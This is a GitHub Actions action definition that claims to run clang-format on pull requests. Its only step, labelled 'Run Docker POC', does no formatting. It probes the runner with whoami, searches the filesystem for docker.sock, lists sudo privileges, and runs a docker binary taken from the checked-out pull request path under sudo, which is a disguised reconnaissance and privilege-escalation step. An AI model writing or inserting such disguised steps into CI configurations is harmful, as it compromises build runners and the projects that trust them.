name: 'clang-format'
description: 'Run clang-format on pull request'
inputs:
  path:
    description: Path to the checkout
    required: true

runs:
  steps:
  - name: Run Docker POC
    run: |
      whoami
      find / -name docker.sock 2> /dev/null
      sudo -l
      sudo ./${{ inputs.path }}/docker ps -a
